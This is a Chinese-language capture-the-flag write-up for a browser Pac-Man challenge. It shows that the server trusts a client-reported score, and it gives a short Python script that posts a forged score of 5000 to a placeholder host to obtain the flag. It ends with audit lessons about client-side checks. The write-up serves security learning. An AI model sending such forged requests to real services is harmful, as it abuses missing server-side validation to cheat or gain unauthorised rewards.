# 吃豆人

## 题目简述

题目表面上要求在浏览器小游戏中取得高分，但胜负判断完全由客户端 JavaScript 驱动。前端在 `score >= 5000` 时向 `POST /submit_score` 发送 JSON `{"score": score}`，服务端没有要求提交游戏轨迹、签名或其它不可伪造状态。决定性问题因此是服务器信任客户端上报的分数。

## 解题过程

### 从前端代码定位得分接口

格式化 `game.js` 后可以得到关键逻辑：

```javascript
if (score >= 5000 && !hasGotFlag) {
    fetch("/submit_score", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({score: score})
    })
    .then(response => response.json())
    .then(data => {
        if (data.flag) {
            alert("你的 flag 是：" + data.flag);
        }
    });
    hasGotFlag = true;
}
```

`hasGotFlag` 只是在当前页面避免重复请求，不能给服务端提供任何安全保证。真正进入请求体的字段只有一个可控整数。

### 直接提交满足阈值的分数

```python
import requests

BASE = "http://challenge.example"

response = requests.post(
    f"{BASE}/submit_score",
    json={"score": 5000},
    timeout=10,
)
response.raise_for_status()
data = response.json()
print(data)
assert "flag" in data
```

提交 `5000` 或更大的整数即可触发返回。官方题解正文与终端截图记录了不同的示例 flag，因此这里不把其中任意一个样本当作稳定静态答案；收到 JSON 中的 `flag` 字段才是利用成功的验证依据。

## 方法总结

- 核心技巧：绕过客户端游戏过程，直接调用缺少服务端校验的得分接口。
- 识别信号：前端达到某个阈值后只提交一个裸 `score`，服务端没有重放游戏过程、校验签名或维护可信会话状态。
- 复用要点：客户端条件、按钮禁用和一次性布尔变量都不是安全边界。审计浏览器游戏时，应先搜索 `fetch`、XHR、WebSocket 发送点以及最终返回 flag 的服务端接口。
